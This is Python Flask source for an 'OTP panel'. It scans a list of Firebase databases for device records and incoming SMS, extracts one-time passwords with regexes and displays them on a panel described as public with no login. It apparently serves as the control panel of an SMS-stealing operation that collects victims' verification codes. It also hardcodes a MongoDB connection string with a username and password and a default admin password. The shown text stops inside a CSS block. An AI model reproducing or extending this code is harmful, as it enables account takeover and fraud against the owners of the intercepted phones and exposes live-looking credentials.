#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TOCXIC EAGLE OTP PANEL — v70 NO-LOGIN USER EDITION
Users: Public access (no login)
Admin: Password / URL-Key protected
BG_REFRESH_INTERVAL = 600s (auto reload every 10 min)
"""

from flask import Flask, request, jsonify, session, redirect, url_for, Response, abort
from functools import wraps
from pymongo import MongoClient
from bson import ObjectId
import requests, os, re, json, threading, time, hashlib
from collections import Counter
from datetime import datetime, timezone, timedelta


# ============================================================
# APP SETUP  (LOCALHOST FIX)
# ============================================================
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "tocxic-eagle-secret-key-local-2026")
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=False,   # localhost = HTTP. Set True in prod behind HTTPS.
    PERMANENT_SESSION_LIFETIME=timedelta(days=7),
)

# ============================================================
# ENV CONFIG
# ============================================================
MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://RahulRORO:Rahulboss@cluster0.xfwjmqk.mongodb.net/?appName=Cluster0")
IS_SERVERLESS = os.environ.get("IS_SERVERLESS", "false").lower() in ("1", "true", "yes")

ADMIN_URL_KEY = os.environ.get("ADMIN_URL_KEY", "tocxic-master-2026-v69")
BG_REFRESH_INTERVAL = 600
MESSAGE_CACHE_TTL = 5
MAX_SMS_PER_NUMBER = 60
FETCH_TIMEOUT = 8
FAST_FETCH_TIMEOUT = 8
MAX_PARALLEL = 20
MAX_DEVICES_PER_FB = 300
IST = timezone(timedelta(hours=5, minutes=30))
FB_HASH_SALT = os.environ.get("FB_HASH_SALT", "tocxic_eagle_salt_2026_v70")
DEFAULT_ADMIN_PWD = os.environ.get("DEFAULT_ADMIN_PWD", "admin123")

# ============================================================
# MONGODB
# ============================================================
MONGO_OK = False
mongo_client = db = fb_collection = settings_collection = None
_mongo_ready = False
_mongo_lock = threading.Lock()


def fb_hash(url):
    return hashlib.sha256((FB_HASH_SALT + url.rstrip("/")).encode()).hexdigest()[:16]


def init_mongo(force=False):
    global MONGO_OK, mongo_client, db, fb_collection, settings_collection, _mongo_ready
    if _mongo_ready and not force:
        return MONGO_OK
    with _mongo_lock:
        if _mongo_ready and not force:
            return MONGO_OK
        try:
            mongo_client = MongoClient(
                MONGO_URI,
                serverSelectionTimeoutMS=4000,
                connectTimeoutMS=4000,
                socketTimeoutMS=8000,
                maxPoolSize=20,
                retryWrites=True,
            )
            db = mongo_client["otp_panel"]
            fb_collection = db["firebases"]
            settings_collection = db["settings"]
            mongo_client.admin.command("ping")
            MONGO_OK = True
            print("MongoDB connected")
        except Exception as e:
            MONGO_OK = False
            print(f"MongoDB error: {e}")
        finally:
            _mongo_ready = True
    return MONGO_OK


def get_pwd(role):
    if not MONGO_OK:
        return DEFAULT_ADMIN_PWD
    try:
        doc = settings_collection.find_one({"_id": f"{role}_password"})
        if doc and doc.get("value"):
            return doc["value"]
    except Exception:
        pass
    return DEFAULT_ADMIN_PWD


def set_pwd(role, pwd):
    if not MONGO_OK:
        return False
    try:
        settings_collection.update_one(
            {"_id": f"{role}_password"},
            {"$set": {"value": pwd, "updated_at": int(time.time())}},
            upsert=True,
        )
        return True
    except Exception:
        return False


# ============================================================
# CACHE
# ============================================================
cache = {
    "numbers_map": {},
    "devices": {},
    "device_messages": {},
    "msg_cache_time": {},
    "stats": {"total": 0, "online": 0, "offline": 0, "otp_rate": 0},
    "last_update": 0,
    "loading": False,
    "progress": {"done": 0, "total": 0},
    "lock": threading.Lock(),
    "inbox_locks": {},
    "fb_stats": {},
    "fb_stats_time": 0,
}

# ============================================================
# FIELD SETS
# ============================================================
NUM_FIELDS = {
    "number", "phone", "phonenumber", "mobno", "mobile", "msisdn", "simnumber",
    "sim1number", "sim2number", "line1number", "line2number", "subscriberid",
    "devicephonenumber", "to", "from", "receiver", "sender", "address", "origin", "src",
    "tonumber", "to_number", "fromaddress", "tophoneno", "mob_no", "senderid",
    "destination", "dest", "recipient", "phonenum", "sim_phone_no",
    "sim1_phone_no", "sim2_phone_no", "operatornumber", "phno"
}
MSG_FIELDS = {
    "message", "body", "text", "msg", "content", "messagetext", "messagebody",
    "sms", "smsbody", "smscontent", "smsbodytext", "lastmessage", "fullmessage",
    "sms_message", "msgbody"
}
TIME_FIELDS = {
    "timestamp", "time", "date", "receivedtime", "datetime", "createdat",
    "senttime", "smstime", "devicetime", "date_time", "received_time",
    "sent_time", "sms_time", "device_time", "smsdate", "receivedat", "sentat",
    "lastmessagetime", "recvtime", "logtime", "event_time"
}
SENT_KEYS = {"command", "commands", "sendsms", "action", "webhookevent",
             "send_sms", "sentsms", "outgoing", "sent_messages", "outbox"}
INCOMING_TYPES = {"incoming", "received", "inbox", "recv", "in"}

# ============================================================
# HELPERS
# ============================================================
def digits_only(s):
    return re.sub(r"\D", "", str(s) if s is not None else "")


def normalize_number(n):
    d = digits_only(n)
    return d[-10:] if len(d) >= 10 else d


def is_clean_phone_number(s):
    if not s or not isinstance(s, str):
        return False
    s = s.strip()
    if not s or len(s) > 25:
        return False
    if any(c in s for c in ("|", ":", "/", "\\", "T", "Z")):
        return False
    if any(w in s.lower() for w in ("otp", "password", "http", "@", "#", "msg", "am", "pm")):
        return False
    if not re.fullmatch(r"[\+\d\s\-]+", s):
        return False
    return 10 <= len(digits_only(s)) <= 15


def extract_real_numbers_from_message(message):
    if not message:
        return []
    text = re.sub(r'\d{3,4}[Xx*]{2,6}\d{2,4}', ' ', str(message))
    found, seen = [], set()
    for m in re.finditer(r'\+91[\s\-]?([6-9]\d{9})', text):
        n = m.group(1)
        if n not in seen:
            seen.add(n); found.append(n)
    for m in re.finditer(r'(?<!\d)([6-9]\d{9})(?!\d)', text):
        n = m.group(1)
        if n not in seen:
            seen.add(n); found.append(n)
    return found


def parse_date_string(s):
    if not s or not isinstance(s, str):
        return 0
    try:
        m = re.match(r"(\d{1,2})-(\d{1,2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})\s*(am|pm)",
                     s.strip(), re.IGNORECASE)
        if not m:
            return 0
        day, month, year, hour, minute, ap = m.groups()
        hour = int(hour)
        if ap.lower() == "pm" and hour != 12: hour += 12
        if ap.lower() == "am" and hour == 12: hour = 0
        dt = datetime(int(year), int(month), int(day), hour, int(minute), tzinfo=IST)
        return int(dt.timestamp())
    except Exception:
        return 0


def collect_all_numbers(obj, found=None, depth=0):
    if found is None: found = []
    if depth > 8: return found
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(v, str) and k.lower() in NUM_FIELDS and is_clean_phone_number(v):
                found.append(v.strip())
            if isinstance(v, (dict, list)):
                collect_all_numbers(v, found, depth + 1)
    elif isinstance(obj, list):
        for item in obj:
            collect_all_numbers(item, found, depth + 1)
    return found


def collect_all_messages(obj, found=None, depth=0, parent_ts=0, parent_key=""):
    if found is None: found = []
    if depth > 10: return found
    if any(k in parent_key.lower() for k in SENT_KEYS): return found

    if isinstance(obj, dict):
        kl = {k.lower() for k in obj.keys()}
        if kl & MSG_FIELDS:
            def get_any(fs):
                for k in obj.keys():
                    if k.lower() in fs: return obj[k]
                return None
            body = get_any(MSG_FIELDS)
            to_val = from_val = num = None
            for k in obj.keys():
                kk = k.lower()
                if kk in ("to", "recipient", "tonumber", "to_number", "receiver", "destination", "dest"):
                    to_val = obj[k]
                elif kk in ("from", "sender", "fromnumber", "from_number", "address",
                            "originatingaddress", "senderaddress", "originator", "source", "src"):
                    from_val = obj[k]
                elif kk in NUM_FIELDS and num is None:
                    num = obj[k]
            date_str = None
            for k in obj.keys():
                if k.lower() in ("datetime", "date_time", "date", "datetimestr"):
                    v = obj[k]
                    if isinstance(v, str) and ("|" in v or "am" in v.lower() or "pm" in v.lower()):
                        date_str = v; break
            ts = parse_date_string(date_str) if date_str else 0
            if not ts:
                ts_raw = get_any(TIME_FIELDS)
                if ts_raw:
                    try:
                        ts = int(ts_raw)
                        if ts > 1e12: ts = ts // 1000
                    except Exception:
                        ts = 0
            msg_id = obj.get("id")
            if not ts and msg_id:
                try:
                    mid = int(msg_id)
                    if mid > 1e12: ts = mid // 1000
                    elif mid > 1e9: ts = mid
                except Exception:
                    pass
            if not ts: ts = parent_ts
            msg_type = str(obj.get("type", "")).lower().strip()
            is_sended = obj.get("isSended") if "isSended" in obj else obj.get("isSent")
            keep = True
            if msg_type in INCOMING_TYPES: keep = True
            elif msg_type in ("sent", "outgoing", "outbox", "send", "sentmessage", "sentsms"): keep = False
            elif is_sended is True: keep = False
            elif is_sended is False: keep = True
            elif from_val and not to_val: keep = True
            elif to_val and not from_val: keep = False
            elif not to_val and not from_val: keep = True
            else: keep = False
            if keep and body:
                display_from = from_val if from_val else (num if num else "Unknown")
                found.append({
                    "from": str(display_from) if display_from else "Unknown",
                    "to": str(to_val) if to_val else "",
                    "message": str(body),
                    "timestamp": ts,
                    "date_string": date_str,
                    "id": msg_id,
                    "type": "received",
                })
        for k, v in obj.items():
            if any(x in k.lower() for x in SENT_KEYS): continue
            child_ts = parent_ts
            try:
                tk = int(k)
                if tk > 1e12: child_ts = tk // 1000
                elif tk > 1e9: child_ts = tk
            except Exception:
                pass
            collect_all_messages(v, found, depth + 1, child_ts, k)
    elif isinstance(obj, list):
        for item in obj:
            collect_all_messages(item, found, depth + 1, parent_ts, parent_key)
    return found


def extract_otp(text):
    if not text: return ""
    m = re.search(r"(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})",
                  text, re.IGNORECASE)
    if m: return m.group(1)
    m = re.search(r"(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)", text, re.IGNORECASE)
    if m: return m.group(1)
    m = re.search(r"#(\d{4,8})", text)
    if m: return m.group(1)
    return ""


def numbers_match(a, b):
    na, nb = normalize_number(a), normalize_number(b)
    return na == nb and na != ""


def is_online(info):
    if not isinstance(info, dict): return False
    if info.get("status") is True or info.get("isOnline") is True: return True
    if info.get("online") is True or info.get("connected") is True: return True
    if info.get("status") in ("online", "active", 1): return True
    if info.get("lastSeen"):
        try:
            if time.time() - int(info["lastSeen"]) < 600: return True
        except Exception:
            pass
    return False


def find_real_number_from_messages(all_msgs):
    counter = Counter()
    senders = set()
    for m in all_msgs:
        for sn in extract_real_numbers_from_message(m.get("from", "")):
            senders.add(sn)
    for m in all_msgs:
        if m.get("type") != "received": continue
        for n in extract_real_numbers_from_message(m.get("message", "")):
            if n in senders: continue
            if n.startswith(("1800", "1900", "1991")): continue
            counter[n] += 1
    return counter.most_common(10)


def parse_device_full(dev_data, dev_id):
    online = is_online(dev_data)
    name = dev_id[:16]
    for f in ["deviceName", "device_name", "name", "model", "deviceModel", "brand",
              "manufacturer", "phoneName", "phoneModel", "deviceInfo", "productName",
              "hardware", "deviceBrand"]:
        v = dev_data.get(f)
        if v and isinstance(v, str) and v.strip():
            name = v.strip()[:25]; break
    sims = []
    seen = set()
    for n in collect_all_numbers(dev_data):
        k = normalize_number(n)
        if not k or k in seen: continue
        seen.add(k)
        sims.append({"slot": 0, "number": n, "online": online, "confidence": 0})
    msgs = collect_all_messages(dev_data)
    seen_m, unique = set(), []
    for m in msgs:
        h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
        if h in seen_m: continue
        seen_m.add(h); unique.append(m)
    unique.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    per = {n["number"]: [] for n in sims}
    unmatched = []
    for m in unique:
        matched = False
        for n in sims:
            if numbers_match(m.get("to", ""), n["number"]) or numbers_match(m.get("from", ""), n["number"]):
                per[n["number"]].append(m); matched = True; break
        if not matched: unmatched.append(m)
    if unmatched and sims:
        for n in sims: per[n["number"]].extend(unmatched)
    for num in per:
        per[num].sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
        per[num] = per[num][:MAX_SMS_PER_NUMBER]
    return {
        "name": name, "online": online, "sims": sims,
        "battery": dev_data.get("battery", 0) if isinstance(dev_data, dict) else 0,
        "messages": unique[:MAX_SMS_PER_NUMBER], "per_number": per,
        "total_msgs": len(unique),
        "total_otp": sum(1 for m in unique if extract_otp(m.get("message", ""))),
    }


# ============================================================
# HTTP SESSION
# ============================================================
_tls = threading.local()


def _sess():
    if not hasattr(_tls, "s"):
        s = requests.Session()
        s.headers.setdefault("User-Agent", "Mozilla/5.0")
        _tls.s = s
    return _tls.s


def try_json(url, timeout=FETCH_TIMEOUT):
    try:
        r = _sess().get(url, timeout=timeout)
        if r.status_code != 200: return None
        t = r.text.strip()
        if not t or t == "null": return None
        return json.loads(t)
    except Exception:
        return None


# ============================================================
# FETCH
# ============================================================
def fetch_device_ids(fb_url):
    base = fb_url.rstrip("/")
    for path in ["/clients.json?shallow=true", "/clients.json",
                 "/devices.json?shallow=true", "/devices.json",
                 "/users.json?shallow=true", "/users.json",
                 "/data.json?shallow=true", "/data.json"]:
        d = try_json(base + path)
        if isinstance(d, dict) and d:
            return list(d.keys())
    return []


def fetch_device_data(fb_url, dev_id):
    base = fb_url.rstrip("/")
    for p in [f"/clients/{dev_id}.json", f"/devices/{dev_id}.json",
              f"/users/{dev_id}.json", f"/data/{dev_id}.json", f"/{dev_id}.json"]:
        d = try_json(base + p)
        if isinstance(d, dict): return d
    return None


SMS_PATHS = [
    "/messages/{id}.json", "/clients/{id}/messages.json", "/clients/{id}/sms.json",
    "/clients/{id}/smsInbox.json", "/clients/{id}/inbox.json",
    "/clients/{id}/receivedSms.json", "/clients/{id}/received.json",
    "/clients/{id}/incoming.json", "/clients/{id}/smsList.json",
    "/clients/{id}/receivedMessages.json", "/clients/{id}/messageList.json",
    "/clients/{id}/allSms.json", "/clients/{id}/allMessages.json",
    "/clients/{id}/history.json", "/clients/{id}/logs.json",
    "/devices/{id}/messages.json", "/devices/{id}/sms.json",
    "/devices/{id}/inbox.json", "/devices/{id}/receivedSms.json",
    "/users/{id}/messages.json", "/users/{id}/sms.json",
    "/data/{id}/messages.json", "/sms/{id}.json", "/inbox/{id}.json",
    "/received/{id}.json", "/incoming/{id}.json", "/messages/{id}/sms.json",
]


def fetch_messages_primary(fb_url, dev_id):
    base = fb_url.rstrip("/")
    all_msgs, seen = [], set()
    for tpl in SMS_PATHS:
        data = try_json(base + tpl.format(id=dev_id), timeout=8)
        if not data: continue
        for m in collect_all_messages(data):
            h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
            if h in seen: continue
            seen.add(h); all_msgs.append(m)
    all_msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    return all_msgs


def fetch_messages_multi_path(fb_url, dev_id, phone_numbers=None):
    base = fb_url.rstrip("/")
    all_msgs, seen = [], set()
    data = try_json(f'{base}/messages/{dev_id}.json?orderBy="$key"&limitToLast=60',
                    timeout=FAST_FETCH_TIMEOUT)
    if not data:
        data = try_json(f'{base}/messages/{dev_id}.json', timeout=20)
    if data and isinstance(data, dict):
        for m in collect_all_messages(data):
            h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
            if h in seen: continue
            seen.add(h); all_msgs.append(m)
    for m in fetch_messages_primary(fb_url, dev_id):
        h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
        if h in seen: continue
        seen.add(h); all_msgs.append(m)
    all_msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    return all_msgs[:MAX_SMS_PER_NUMBER]


def fetch_devices_from_one_fb(fb_url, fb_name="", fb_id=""):
    out = []
    ids = fetch_device_ids(fb_url)[:MAX_DEVICES_PER_FB]
    for did in ids:
        raw = fetch_device_data(fb_url, did)
        if not raw: continue
        dev = parse_device_full(raw, did)
        msgs = fetch_messages_primary(fb_url, did)
        if msgs:
            existing = set()
            for m in dev["messages"]:
                existing.add(f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}")
            for m in msgs:
                h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
                if h not in existing:
                    dev["messages"].append(m); existing.add(h)
            dev["messages"].sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
            dev["messages"] = dev["messages"][:MAX_SMS_PER_NUMBER]
            dev["total_msgs"] = len(dev["messages"])
            dev["total_otp"] = sum(1 for m in dev["messages"] if extract_otp(m.get("message", "")))
        if not dev["sims"]:
            top = find_real_number_from_messages(dev["messages"])
            if top:
                dev["sims"] = [{"slot": 0, "number": top[0][0], "online": dev["online"], "confidence": top[0][1]}]
            else:
                dev["sims"] = [{"slot": 0, "number": "UNKNOWN-" + did[:6], "online": dev["online"], "confidence": 0}]
        per = {s["number"]: [] for s in dev["sims"]}
        unmatched = []
        for m in dev["messages"]:
            matched = False
            for n in dev["sims"]:
                if numbers_match(m.get("to", ""), n["number"]) or numbers_match(m.get("from", ""), n["number"]):
                    per[n["number"]].append(m); matched = True; break
            if not matched: unmatched.append(m)
        if unmatched and dev["sims"]:
            for n in dev["sims"]: per[n["number"]].extend(unmatched)
        for num in per:
            per[num].sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
            per[num] = per[num][:MAX_SMS_PER_NUMBER]
        dev["per_number"] = per
        with cache["lock"]:
            cache["device_messages"][f"{fb_url}|{did}"] = list(dev["messages"])
            cache["msg_cache_time"][f"{fb_url}|{did}"] = time.time()
        dev["id"] = did
        dev["firebase"] = fb_url
        dev["fb_name"] = fb_name
        dev["fb_id"] = fb_id
        out.append(dev)
    return out


def merge_numbers_into_cache(devices):
    with cache["lock"]:
        for dev in devices:
            online = dev.get("online", False)
            for sim in dev.get("sims", []):
                num = sim["number"]
                key = num if num.startswith("UNKNOWN-") else normalize_number(num)
                if not key or (not num.startswith("UNKNOWN-") and len(key) != 10):
                    continue
                msgs = dev.get("per_number", {}).get(num, [])
                otp_c = sum(1 for m in msgs if extract_otp(m.get("message", "")))
                if key not in cache["numbers_map"]:
                    cache["numbers_map"][key] = {
                        "number": num, "device_id": dev["id"],
                        "device_name": dev.get("name", ""),
                        "firebase": dev.get("firebase", ""),
                        "fb_id": dev.get("fb_id", ""),
                        "fb_name": dev.get("fb_name", ""),
                        "online": online, "msg_count": len(msgs), "otp_count": otp_c,
                        "battery": dev.get("battery", "?"),
                        "confidence": sim.get("confidence", 0),
                    }
                else:
                    ex = cache["numbers_map"][key]
                    if sim.get("confidence", 0) > ex.get("confidence", 0):
                        ex["number"] = num; ex["confidence"] = sim.get("confidence", 0)
                    if len(msgs) > ex["msg_count"]:
                        ex.update({"device_id": dev["id"], "device_name": dev.get("name", ""),
                                   "firebase": dev.get("firebase", ""), "fb_id": dev.get("fb_id", ""),
                                   "fb_name": dev.get("fb_name", ""),
                                   "msg_count": len(msgs), "otp_count": otp_c, "online": online})
                    elif online and not ex["online"]:
                        ex["online"] = True
            cache["devices"][f"{dev['firebase']}|{dev['id']}"] = dev
        nums = list(cache["numbers_map"].values())
        online = sum(1 for n in nums if n.get("online"))
        total_otp = sum(n.get("otp_count", 0) for n in nums)
        total_msg = sum(n.get("msg_count", 0) for n in nums)
        cache["stats"] = {
            "total": len(nums), "online": online, "offline": len(nums) - online,
            "otp_rate": int((total_otp / total_msg) * 100) if total_msg > 0 else 0,
        }


def fetch_fb_stats():
    init_mongo()
    if not MONGO_OK: return
    try:
        fbs = list(fb_collection.find({}))
    except Exception:
        return
    results = {}
    sem = threading.Semaphore(MAX_PARALLEL)

    def worker(fb):
        with sem:
            url = fb.get("url", "")
            fid = str(fb.get("_id", ""))
            if not url:
                results[fid] = {"online": 0, "offline": 0, "devices": 0}; return
            try:
                devs = fetch_devices_from_one_fb(url, fb.get("name", ""), fid)
                on = sum(1 for d in devs if d.get("online"))
                results[fid] = {"online": on, "offline": len(devs) - on, "devices": len(devs)}
            except Exception as e:
                print(f"fb_stats err {url}: {e}")
                results[fid] = {"online": 0, "offline": 0, "devices": 0}

    ts = []
    for fb in fbs:
        t = threading.Thread(target=worker, args=(fb,), daemon=True)
        t.start(); ts.append(t)
    for t in ts: t.join(timeout=60)
    with cache["lock"]:
        cache["fb_stats"] = results
        cache["fb_stats_time"] = time.time()


def fetch_all_devices():
    init_mongo()
    if not MONGO_OK: return
    try:
        fbs = list(fb_collection.find({}))
    except Exception:
        return
    with cache["lock"]:
        cache["progress"] = {"done": 0, "total": len(fbs)}
    sem = threading.Semaphore(MAX_PARALLEL)

    def worker(fb):
        with sem:
            url = fb.get("url", "")
            if not url:
                with cache["lock"]: cache["progress"]["done"] += 1
                return
            try:
                merge_numbers_into_cache(fetch_devices_from_one_fb(url, fb.get("name", ""), str(fb.get("_id", ""))))
            except Exception as e:
                print(f"worker err {url}: {e}")
            with cache["lock"]: cache["progress"]["done"] += 1

    ts = []
    for fb in fbs:
        t = threading.Thread(target=worker, args=(fb,), daemon=True)
        t.start(); ts.append(t)
    for t in ts: t.join(timeout=90)


def refresh_cache():
    with cache["lock"]:
        if cache["loading"]: return
        cache["loading"] = True
        cache["numbers_map"] = {}
        cache["devices"] = {}
        cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
    try:
        fetch_all_devices()
        fetch_fb_stats()
        with cache["lock"]: cache["last_update"] = time.time()
    except Exception as e:
        print(f"Refresh err: {e}")
    finally:
        with cache["lock"]: cache["loading"] = False


def bg_refresher():
    """Auto reload every 600s (10 min)"""
    time.sleep(5)
    while True:
        try:
            refresh_cache()
        except Exception as e:
            print(f"BG: {e}")
        time.sleep(BG_REFRESH_INTERVAL)


# ============================================================
# ADMIN AUTH DECORATOR (only admin needs it now)
# ============================================================
def admin_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get("is_admin") and not (session.get("logged_in") and session.get("role") == "admin"):
            if request.path.startswith("/api/"):
                return jsonify({"success": False, "error": "Admin required"}), 401
            return redirect(url_for("admin_login_page"))
        return f(*args, **kwargs)
    return wrapper


# ============================================================
# SHARED STYLES
# ============================================================
MOBILE_CSS = """
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,system-ui,sans-serif}
html,body{overscroll-behavior-y:contain}
input,button,textarea,select{font-size:16px !important;-webkit-appearance:none}
button{touch-action:manipulation;cursor:pointer}
"""

ORBITRON = """
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;600;700;800;900&display=swap" rel="stylesheet">
"""

BRAND_CSS = """
:root{--red:#E40000;--red2:#FF4D4D;--blue:#0F3CC9;--blue2:#3B82F6;
--grad:linear-gradient(135deg,#E40000 0%,#0F3CC9 100%);
--grad-r:linear-gradient(135deg,#E40000 0%,#FF4D4D 100%);
--grad-b:linear-gradient(135deg,#0F3CC9 0%,#3B82F6 100%);
--bg:#f5f6fa;--card:#fff;--text:#101828;--muted:#667085;--muted2:#98a2b3;
--sep:rgba(16,24,40,.08);--ok:#12b76a;--err:#f04438;--warn:#f79009}
html,body{-webkit-font-smoothing:antialiased}
body{background:var(--bg);color:var(--text);min-height:100vh;padding:0 0 60px}
.topbar{background:var(--card);padding:12px 16px;display:flex;align-items:center;
justify-content:space-between;position:sticky;top:0;z-index:100;
box-shadow:0 1px 3px rgba(16,24,40,.06);flex-wrap:wrap;gap:10px;
padding-top:calc(12px + env(safe-area-inset-top));border-bottom:1px solid var(--sep)}
.brand{display:flex;align-items:center;gap:10px;
font-family:'Orbitron',sans-serif;font-weight:800;font-size:14px;letter-spacing:1px}
.brand .eagle{font-size:22px;filter:drop-shadow(0 2px 6px rgba(228,0,0,.35))}
.brand .name{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
.brand .sub{color:var(--muted2);font-size:9px;letter-spacing:2px;display:block;margin-top:-2px}
.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
.nav-link{padding:9px 14px;border-radius:12px;text-decoration:none;font-size:12px;
font-weight:700;color:#475467;background:rgba(16,24,40,.05);transition:.2s;
white-space:nowrap;min-height:40px;display:inline-flex;align-items:center}
.nav-link.active{background:var(--grad);color:#fff;box-shadow:0 4px 12px rgba(228,0,0,.25)}
.nav-link.otp{background:rgba(18,183,106,.12);color:#05603a}
.nav-link.otp.active{background:linear-gradient(135deg,#12b76a,#32d583);color:#fff}
.nav-link.sec{background:rgba(247,144,9,.14);color:#93370d}
.nav-link.sec.active{background:linear-gradient(135deg,#f79009,#fdb022);color:#fff}
.conn{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:700;
padding:7px 12px;border-radius:20px}
.conn.online{color:#05603a;background:rgba(18,183,106,.14)}
.conn.offline{color:#b42318;background:rgba(240,68,56,.12)}
.conn.loading{color:#93370d;background:rgba(247,144,9,.14)}
.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
.conn.online .dot{animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.45}}
.container{max-width:920px;margin:0 auto;padding:16px}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px}
.stat{background:var(--card);border-radius:18px;padding:18px;
box-shadow:0 2px 10px rgba(16,24,40,.05);border:1px solid var(--sep)}
.stat .label{font-family:'Orbitron',sans-serif;font-size:10px;color:var(--muted);
font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:8px}
.stat .value{font-family:'Orbitron',sans-serif;font-size:32px;font-weight:800;line-height:1}
.stat.total .value{color:#007aff}
.stat.online .value{color:#12b76a}
.stat.offline .value{color:#E40000}
.stat.otp .value{color:#7c3aed}
.quick{background:var(--card);border-radius:18px;padding:16px;margin-bottom:14px;
display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;
border:1px solid var(--sep)}
.quick .info{font-size:13px;color:var(--muted)}
.quick .info b{color:var(--text);font-size:15px;font-family:'Orbitron',sans-serif;font-weight:800}
.quick .btns{display:flex;gap:8px;flex-wrap:wrap}
.quick a,.quick button{padding:10px 18px;background:var(--grad);color:#fff;text-decoration:none;
border-radius:12px;font-size:12px;font-weight:700;border:none;font-family:inherit;
transition:.2s;min-height:42px;display:inline-flex;align-items:center;gap:6px}
.quick button.green{background:linear-gradient(135deg,#12b76a,#32d583)}
.num-filter-bar{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
.num-filter-btn{flex:1;min-width:100px;padding:14px 12px;font-size:13px;font-weight:700;
border-radius:14px;border:1px solid var(--sep);background:var(--card);color:var(--muted);
cursor:pointer;transition:.2s;display:flex;align-items:center;justify-content:center;gap:8px;
font-family:inherit;min-height:48px}
.num-filter-btn.active{color:#fff;border-color:transparent}
.num-filter-btn#nf-all.active{background:var(--grad)}
.num-filter-btn#nf-online.active{background:linear-gradient(135deg,#12b76a,#32d583)}
.num-filter-btn#nf-offline.active{background:var(--grad-r)}
.num-filter-btn .cnt{background:rgba(16,24,40,.08);padding:2px 9px;border-radius:10px;
font-size:11px;font-weight:800;font-family:'Orbitron',sans-serif;min-width:24px;text-align:center}
.num-filter-btn.active .cnt{background:rgba(255,255,255,.28);color:#fff}
.list-header{display:flex;justify-content:space-between;align-items:center;
margin-bottom:12px;padding:0 4px}
.list-header h2{font-size:15px;font-weight:800;color:#344054;display:flex;align-items:center;gap:8px}
.list-header .count{font-size:12px;color:var(--muted);background:rgba(16,24,40,.06);
padding:4px 12px;border-radius:20px;font-weight:800;font-family:'Orbitron',sans-serif}
.search-box{margin-bottom:14px}
.search-box input{width:100%;padding:14px 18px;border-radius:14px;border:1px solid var(--sep);
background:var(--card);font-size:15px;outline:none;color:var(--text)}
.search-box input:focus{border-color:var(--red);box-shadow:0 0 0 4px rgba(228,0,0,.12)}
.num-card{background:var(--card);border-radius:18px;padding:16px;margin-bottom:10px;
display:flex;align-items:center;gap:14px;cursor:pointer;transition:.15s;
border:1px solid var(--sep)}
.num-card.offline{opacity:.78}
.num-icon{width:46px;height:46px;border-radius:14px;display:flex;align-items:center;
justify-content:center;font-size:22px;flex-shrink:0;background:linear-gradient(135deg,#d1fae5,#a7f3d0)}
.num-icon.red{background:linear-gradient(135deg,#fee4e2,#fecaca)}
.num-icon.gray{background:linear-gradient(135deg,#eaecf0,#d0d5dd)}
.num-info{flex:1;min-width:0}
.num-title{font-size:15px;font-weight:800;color:var(--text);overflow:hidden;
text-overflow:ellipsis;white-space:nowrap;font-family:'Orbitron',sans-serif;letter-spacing:.5px}
.num-title.unknown{color:var(--muted2);font-style:italic}
.num-title .confidence-badge{font-size:10px;background:rgba(18,183,106,.15);color:#05603a;
padding:2px 6px;border-radius:8px;margin-left:4px;font-weight:800}
.num-sub{font-size:11px;color:var(--muted);margin-top:6px;display:flex;gap:6px;flex-wrap:wrap}
.num-sub .pill{background:rgba(16,24,40,.06);padding:3px 9px;border-radius:8px;color:#344054;
font-size:10px;font-weight:700}
.num-sub .pill.otp{background:rgba(15,60,201,.12);color:#0f3cc9}
.badge-online{display:flex;align-items:center;gap:6px;font-size:12px;color:#05603a;
font-weight:800;flex-shrink:0}
.badge-online .dot{width:8px;height:8px;border-radius:50%;background:#12b76a}
.badge-offline{display:flex;align-items:center;gap:6px;font-size:12px;color:#b42318;
font-weight:800;flex-shrink:0}
.badge-offline .dot{width:8px;height:8px;border-radius:50%;background:#E40000}
.arrow{color:var(--muted2);font-size:22px;font-weight:300}
.card-actions{display:flex;gap:6px;flex-shrink:0}
.raw-btn{padding:8px 10px;background:linear-gradient(135deg,#f79009,#fdb022);color:#fff;
border:none;border-radius:8px;font-size:11px;font-weight:800;cursor:pointer;
min-height:36px;display:inline-flex;align-items:center}
.inbox-header{background:var(--card);border-radius:18px;padding:18px;margin-bottom:14px;
border:1px solid var(--sep)}
